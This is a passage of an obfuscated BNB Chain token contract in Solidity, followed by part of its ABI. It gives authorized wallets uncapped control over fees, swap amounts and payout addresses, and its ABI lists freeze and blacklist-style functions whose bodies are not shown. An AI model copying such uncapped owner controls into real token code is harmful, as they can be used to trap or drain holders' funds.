iTxLE[holder] = exempt;\r\n    }\r\n\r\n    function setWME(address holder, bool exempt) external authorized {\r\n        iMxWE[holder] = exempt;\r\n    }\r\n\r\n    function setmfS(uint256 _mff, uint256 _mfs, uint256 _mft, uint256 _mFd) external authorized {\r\n        mFf = _mff;\r\n        mFs = _mfs;\r\n        mFt = _mft;\r\n        mFd = _mFd;\r\n    }\r\n\r\n    function setbbTf(uint256 bttf) external authorized {\r\n        btTf = bttf;\r\n    }\r\n\r\n    function setrsp(address _spE) external authorized {\r\n        spE = _spE;\r\n    }\r\n    \r\n    function kickmtfc() internal {\r\n        uint256 acBNB = address(this).balance;\r\n        uint256 acBNBf = acBNB.mul(cSf).div(cSd);\r\n        uint256 acBNBs = acBNB.mul(cSs).div(cSd);\r\n        uint256 acBNBt = acBNB.mul(cSt).div(cSd);\r\n        (bool tmpSuccess,) = payable(spE).call{value: acBNBf, gas: gso}(\"\");\r\n        (tmpSuccess,) = payable(nbE).call{value: acBNBs, gas: gss}(\"\");\r\n        (tmpSuccess,) = payable(jbE).call{value: acBNBt, gas: gst}(\"\");\r\n        tmpSuccess = false;\r\n    }\r\n\r\n    function setlprr(address _lpR) external authorized {\r\n        lpR = _lpR;\r\n    }\r\n\r\n    function setFFEE(uint256 _liqF, uint256 _rewF, uint256 _marF, uint256 _feeD) external authorized {\r\n        liqF = _liqF;\r\n        rewF = _rewF;\r\n        markF = _marF;\r\n        totF = _liqF.add(_rewF).add(_marF);\r\n        fD = _feeD;\r\n    }\r\n\r\n    function setsste(bool _enabled, uint256 _ssf) external authorized {\r\n        sst = _enabled;\r\n        ssf = _ssf;\r\n    }\r\n\r\n    function setcSn(uint256 _csf, uint256 _css, uint256 _cst, uint256 _csd) external authorized {\r\n        cSf = _csf;\r\n        cSs = _css;\r\n        cSt = _cst;\r\n        cSd = _csd;\r\n    }\r\n\r\n    function setbbfe(bool _enabled, uint256 _bbf) external authorized {\r\n        bbt = _enabled;\r\n        bbf = _bbf;\r\n    }\r\n\r\n    function setrsu(address _nbE) external authorized {\r\n        nbE = _nbE;\r\n    }\r\n\r\n    function setcSb(uint256 _csbt) external authorized {\r\n        cSbT = _csbt;\r\n    }\r\n\r\n    function setrjue(address _jbE) external authorized {\r\n        jbE = _jbE;\r\n    }\r\n\r\n    function varST(uint256 amount) internal view returns (uint256) {\r\n        uint256 variableSTd = amount.mul(vsN).div(vsD);\r\n        if(vsWb && variableSTd <= sT){ return variableSTd; }\r\n        if(vsWb && variableSTd > sT){ return sT; }\r\n        return sT;\r\n    }\r\n\r\n    function setFact(uint256 _xfact, uint256 _yfact, uint256 _zfact) external authorized {\r\n        xr = _xfact;\r\n        yr = _yfact;\r\n        zr = _zfact;\r\n    }\r\n\r\n    function vswBk(uint256 amount) internal swapping {\r\n        uint256 dynamicLiq = isOverLiquified(tL, tLD) ? 0 : yr;\r\n        uint256 amountL = varST(amount).mul(dynamicLiq).div(tLD).div(2);\r\n        uint256 totalSw = varST(amount).sub(amountL);\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = WBNB;\r\n        uint256 bB = address(this).balance;\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            totalSw, //raining.shitcoins\r\n            0, \r\n            path,\r\n            address(this),\r\n            block.timestamp );\r\n        uint256 aBNB = address(this).balance.sub(bB);\r\n        uint256 tBNBF = tLD.sub(dynamicLiq.div(2));\r\n        uint256 aBNBL = aBNB.mul(dynamicLiq).div(tBNBF).div(2);\r\n        uint256 aBNBR = aBNB.mul(xr).div(tBNBF);\r\n        uint256 aBNBTM = aBNB.mul(zr).div(tBNBF);\r\n        try distributor.deposit{value: aBNBR}() {} catch {}\r\n        (bool tmpSuccess,) = payable(spE).call{value: (aBNBTM.mul(mFf).div(mFd)), gas: gso}(\"\");\r\n        (tmpSuccess,) = payable(mnbE).call{value: (aBNBTM).mul(mFs).div(mFd), gas: gss}(\"\");\r\n        (tmpSuccess,) = payable(jbE).call{value: (aBNBTM).mul(mFt).div(mFd), gas: gst}(\"\");\r\n        tmpSuccess = false;\r\n        if(amountL > 0){\r\n            router.addLiquidityETH{value: aBNBL}(\r\n                address(this),\r\n                amountL,\r\n                0,\r\n                0,\r\n                lpR,\r\n                block.timestamp );\r\n            emit AutoLiquify(aBNBL, amountL); \r\n        }\r\n    }\r\n\r\n    function setswe(bool _enabled, uint256 _amount) external authorized {\r\n        swE = _enabled;\r\n        sT = _totalSupply * _amount / 10000;\r\n    }\r\n\r\n    function setmswt(uint256 _amount) external authorized {\r\n        asT = _totalSupply * _amount / 10000;\r\n    }\r\n\r\n    function setasTsT(uint256 _asT, uint256 _sT) external authorized {\r\n        asT = _totalSupply * _asT / 10000;\r\n        sT = _totalSupply * _sT / 10000;\r\n    }\r\n\r\n    function setTL(uint256 _up, uint256 _down) external authorized {\r\n        tL = _up;\r\n        tLD = _down;\r\n    }\r\n\r\n    function maxTL() external authorized {\r\n        _maxTxAmount = _totalSupply.mul(1);\r\n        _maxWalletToken = _totalSupply.mul(1);\r\n        mStxE = false;\r\n    }\r\n\r\n    function setnewrew(address _nrew, address _prew) external authorized {\r\n        distributor.setnewrw(_nrew, _prew);\r\n    }\r\n\r\n    function deptok(uint256 _amount) external authorized {\r\n        vswBk(_totalSupply * _amount / 10000);\r\n    }\r\n\r\n    function setDistributionCriteria(uint256 _minPeriod, uint256 _minDistribution) external authorized {\r\n        distributor.setDistributionCriteria(_minPeriod, _minDistribution);\r\n    }\r\n\r\n    function setvarsT(bool _enabled, uint256 _vstf, uint256 _vstd) external authorized {\r\n        vsWb = _enabled;\r\n        vsN = _vstf;\r\n        vsD = _vstd;\r\n    }\r\n\r\n    function setgas(uint256 _gso, uint256 _gss, uint256 _gst) external authorized {\r\n        gso = _gso;\r\n        gss = _gss;\r\n        gst = _gst;\r\n    }\r\n\r\n    function setDistributorSettings(uint256 gas) external authorized {\r\n        require(gas < 750000);\r\n        distributorGas = gas;\r\n    }\r\n\r\n    function getCirculatingSupply() public view returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));\r\n    }\r\n\r\n    function getppr(uint256 _aPn, uint256 _aPd) external authorized {\r\n        distributor.cPRwds(_aPn, _aPd);\r\n    }\r\n\r\n    function _getMyRewards() external {\r\n        address shareholder = msg.sender;\r\n        distributor.mdistributeDividend(shareholder);\r\n    }\r\n\r\n    function getMyRewardsOwed(address _wallet) external view returns (uint256){\r\n        return distributor.getRewardsOwed(_wallet);\r\n    }\r\n\r\n    function getMyTotalRewards(address _wallet) external view returns (uint256){\r\n        return distributor.getTotalRewards(_wallet);\r\n    }\r\n\r\n    function getccr(uint256 _aPn, uint256 _aPd) external authorized {\r\n        distributor.cCRwds(_aPn, _aPd);\r\n    }\r\n\r\n    function currentReward() public view returns (address) {\r\n        return distributor.getRAddress();\r\n    }\r\n\r\n    function gettotalRewardsDistributed() public view returns (uint256) {\r\n        return distributor.gettotalDistributed();\r\n    }\r\n\r\n    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {\r\n        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());\r\n    }\r\n\r\n    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {\r\n        return getLiquidityBacking(accuracy) > target;\r\n    }\r\n    \r\n    event AutoLiquify(uint256 amountBNB, uint256 amountWBNB);\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountBNB\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountWBNB\",\"type\":\"uint256\"}],\"name\":\"AutoLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_getMyRewards\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"aP\",\"type\":\"uint256\"}],\"name\":\"approval\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_na\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_da\",\"type\":\"uint256\"}],\"name\":\"approvals\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"approveMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"asT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"authorize\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"bOftT\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"bOftTm\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"bbf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"bbt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currentReward\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"deptok\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCirculatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"accuracy\",\"type\":\"uint256\"}],\"name\":\"getLiquidityBacking\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_wallet\",\"type\":\"address\"}],\"name\":\"getMyRewardsOwed\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_wallet\",\"type\":\"address\"}],\"name\":\"getMyTotalRewards\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"selling\",\"type\":\"bool\"},{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"}],\"name\":\"getTF\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_aPn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_aPd\",\"type\":\"uint256\"}],\"name\":\"getccr\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_aPn\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_aPd\",\"type\":\"uint256\"}],\"name\":\"getppr\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"gettotalRewardsDistributed\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"adr\",\"type\":\"address\"}],\"name\":\"isAuthorized\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"target\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"accuracy\",\"type\":\"uint256\"}],\"name\":\"isOverLiquified\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"isOwner\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mStt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mStx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"mStxE\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTL\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_minPeriod\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_minDistribution\",\"type\":\"uint256\"}],\"name\":\"setDistributionCriteria\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"gas\",\"type\":\"uint256\"}],\"name\":\"setDistributorSettings\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setFE\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_liqF\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_rewF\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_marF\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_feeD\",\"type\":\"uint256\"}],\"name\":\"setFFEE\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_xfact\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_yfact\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_zfact\",\"type\":\"uint256\"}],\"name\":\"setFact\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_mnWP\",\"type\":\"uint256\"}],\"name\":\"setMWP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_mnbTP\",\"type\":\"uint256\"}],\"name\":\"setMbTP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_mnsTP\",\"type\":\"uint256\"}],\"name\":\"setMsTP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_up\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_down\",\"type\":\"uint256\"}],\"name\":\"setTL\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setTLE\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setWME\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"setallEn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_asT\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_sT\",\"type\":\"uint256\"}],\"name\":\"setasTsT\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"},{\"internalType\":\"uint8\",\"name\":\"_int\",\"type\":\"uint8\"}],\"name\":\"setbFrz\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_sstatus\",\"type\":\"bool\"},{\"internalType\":\"bool\",\"name\":\"_mstatus\",\"type\":\"bool\"}],\"name\":\"setbOft\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"bttf\",\"type\":\"uint256\"}],\"name\":\"setbbTf\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"_bbf\",\"type\":\"uint256\"}],\"name\":\"setbbfe\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_csbt\",\"type\":\"uint256\"}],\"name\":\"setcSb\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_csf\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_css\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_cst\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_csd\",\"type\":\"uint256\"}],\"name\":\"setcSn\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_gso\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_gss\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_gst\",\"type\":\"uint256\"}],\"name\":\"setgas\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setiDE\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setisBt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setisBtT\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setisTl\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setistCDh\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_lpR\",\"type\":\"address\"}],\"name\":\"setlprr\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_mff\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_mfs\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_mft\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_mFd\",\"type\":\"uint256\"}],\"name\":\"setmfS\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setmswt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_nrew\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_prew\",\"type\":\"address\"}],\"name\":\"setnewrew\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tfU\",\"type\":\"address\"}],\"name\":\"setrfu\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_jbE\",\"type\":\"address\"}],\"name\":\"setrjue\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_mnbE\",\"type\":\"address\"}],\"name\":\"setrmnb\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spE\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_nbE\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_mnbE\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_jbE\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_newra\",\"type\":\"address\"}],\"name\":\"setrre\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_spE\",\"type\":\"address\"}],\"name\":\"setrsp\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_nbE\",\"type\":\"address\"}],\"name\":\"setrsu\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"},{\"internalType\":\"uint8\",\"name\":\"_int\",\"type\":\"uint8\"}],\"name\":\"setsFrz\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"setsmTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"_ssf\",\"type\":\"uint256\"}],\"name\":\"setsste\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"setswe\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_newra\",\"type\":\"address\"}],\"name\":\"settokdep\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_enabled\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"_vstf\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_vstd\",\"type\":\"uint256\"}],\"name\":\"setvarsT\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_status\",\"type\":\"bool\"}],\"name\":\"setvsWb\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"ssf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sst\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swE\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tadd\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_rec\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tamt\",\"type\":\"uint256\"}],\"name\":\"tokappr\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_tadd\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_rec\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amt\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_amtd\",\"type\":\"uint256\"}],\"name\":\"tokapprd\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"